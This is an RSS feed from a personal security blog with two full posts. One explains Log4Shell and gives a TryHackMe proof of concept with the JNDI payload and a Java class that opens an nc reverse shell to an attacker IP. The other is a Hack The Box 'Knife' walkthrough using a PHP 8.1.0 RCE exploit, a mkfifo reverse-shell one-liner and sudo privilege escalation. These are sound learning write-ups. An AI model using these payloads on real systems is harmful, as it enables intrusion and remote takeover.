<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Somesh&#39;s Blog</title>
    <link>https://somesh-banerjee.github.io/blogs/</link>
    <description>Recent content on Somesh&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 17 Feb 2022 13:27:14 +0530</lastBuildDate><atom:link href="https://somesh-banerjee.github.io/blogs/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Cap</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/cap/</link>
      <pubDate>Thu, 17 Feb 2022 13:27:14 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/cap/</guid>
      <description></description>
      <content></content>
    </item>
    
    <item>
      <title>Explore Machine</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/explore/</link>
      <pubDate>Thu, 17 Feb 2022 13:26:55 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/explore/</guid>
      <description></description>
      <content></content>
    </item>
    
    <item>
      <title>Spectra</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/spectra/</link>
      <pubDate>Thu, 17 Feb 2022 13:26:43 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/spectra/</guid>
      <description></description>
      <content></content>
    </item>
    
    <item>
      <title>Log4shell</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/log4shell/</link>
      <pubDate>Fri, 14 Jan 2022 17:25:22 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/log4shell/</guid>
      <description>Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;logging.ERROR(&amp;quot;error&amp;quot;);
logging.WARN(&amp;quot;warning&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now that username is the actual format used for RCE using log4j. The exploit is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;${jndi:ldap://ATTACKER-SERVER/x}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The exploit can be broken into:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;log4j parses the command and sends a ldap request to ATTACKER-SERVER via jndi.&lt;/li&gt;
&lt;li&gt;The first ATTACKER-SERVER then points to another attacker controlled server which is hosting a malicious Java code.&lt;/li&gt;
&lt;li&gt;The victim requests the malicious code and executes it, leading to RCE.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The process can be visualized with the following figure by &lt;a href=&#34;https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/&#34;&gt;GovCERT&lt;/a&gt;
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The vulnerability was first reported to Apache on 24th November 2021 and publicly announced on 9th December 2021. Many large organizations are affected by this CVE which includes Amazon, Google, Tencent and others. You can find the list &lt;a href=&#34;https://github.com/YfryTchsGD/Log4jAttackSurface&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of Concept&lt;/h1&gt;
&lt;p&gt;We will be using the TryHackMe Solr room for this. The victim machine is running Apache Solr 8.11.0, which has this vulnerability. First I am creating a ldap Reference server. The Reference server will point to another server which will serve the malicious java code. Both the server are running on same machines but different ports.&lt;/p&gt;
&lt;p&gt;For ldap reference server, we will use &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt;. It will serve on port 1389 and point to port 8000. Here is the screenshot
&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now in port 8000, the compiled class of the following java code is served.
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exploit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            java&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Runtime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getRuntime&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Exception e&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
The code just sends a reverse shell to the attacker.&lt;/p&gt;
&lt;p&gt;Now as we are interacting with the victim server using curl and passing the exploit as a parameter, it is getting executed and we are getting the reverse shell from the server.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/4.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The CVE have been patched in log4j update by disabling jndi by default. &lt;a href=&#34;https://log4shell.huntress.com/&#34;&gt;HuntresLabs scanner&lt;/a&gt; can be used to check for Log4Shell vulnerability in your app.&lt;/p&gt;
&lt;p&gt;Some of the resources I used to learn about this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&#34;&gt;https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&#34;&gt;https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;TryHackMe - Solar, exploiting log4j Room&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Knife Machine</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/knife/</link>
      <pubDate>Sun, 29 Aug 2021 13:26:11 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/knife/</guid>
      <description>OS: Linux
Points: 20
Difficulty: Easy
ip=10.10.10.242
User solution The first thing is to do the nmap scan.
┌──(kali㉿kali)-[~/HTB/Knife] └─$ ip=10.10.10.242 ┌──(kali㉿kali)-[~/HTB/Knife] └─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) ┌──(kali㉿kali)-[~/HTB/Knife] └─$ nmap -sC -sV -p$ports $ip -oA nmap_result Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT Nmap scan report for 10.10.10.242 Host is up (0.</description>
      <content>&lt;p&gt;OS: Linux&lt;br&gt;
Points: 20&lt;br&gt;
Difficulty: Easy&lt;/p&gt;
&lt;p&gt;ip=10.10.10.242&lt;/p&gt;
&lt;h2 id=&#34;user-solution&#34;&gt;User solution&lt;/h2&gt;
&lt;p&gt;The first thing is to do the nmap scan.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ip=10.10.10.242

┌──(kali㉿kali)-[~/HTB/Knife]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)

┌──(kali㉿kali)-[~/HTB/Knife]
└─$ nmap -sC -sV -p$ports $ip -oA nmap_result
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 10:29 EDT
Nmap scan report for 10.10.10.242
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.72 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now lets look at website at port 80.&lt;br&gt;
From the nmap scan we know that the server uses Apache 2.4.41 and Ubuntu OS. Using Wappalyzer we found it also uses PHP 8.1.0.\&lt;/p&gt;
&lt;p&gt;There is a RCE exploit for PHP 8.1.0. Download it from &lt;a href=&#34;https://www.exploit-db.com/exploits/49933&#34;&gt;exploit-db&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Run the exploit and got the flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;┌──(kali㉿kali)-[~/HTB/Knife]
└─$ python3 exploits/49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/
Can&#39;t acces tty; job crontol turned off.
$ whoami
james

$ pwd
/

$ cd /home/james; ls; cat user*
authorized_keys
hello
hello.rb
user.txt
aec6c92f2b998dc3912f334ac0c69ed5
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;root-solution&#34;&gt;Root solution&lt;/h2&gt;
&lt;p&gt;Before procedding lets get a reverse shell at port 5454 with &lt;code&gt;mkfifo /tmp/f; nc &amp;lt;local-ip&amp;gt; 5454 &amp;lt; /tmp/f | /bin/sh &amp;gt;/tmp/f 2&amp;gt;&amp;amp;1; rm /tmp/f&lt;/code&gt; and run &lt;code&gt;nc -lvnp 5454&lt;/code&gt; before running the command.&lt;/p&gt;
&lt;p&gt;I was unable to do the root part while the machine was active. Later from a help I realized I forgot to check GTFObins.&lt;/p&gt;
&lt;p&gt;Coming to the process first we have to see which executables we can run as sudo.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Search GTFObins for knife you will get a command for shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;james@knife:/$ sudo knife exec -E &#39;exec &amp;quot;/bin/sh&amp;quot;&#39;
# whoami
root
# cat root/root.txt
b1c946e0dcc0715cb9039799fe824278
&lt;/code&gt;&lt;/pre&gt;</content>
    </item>
    
  </channel>
</rss>
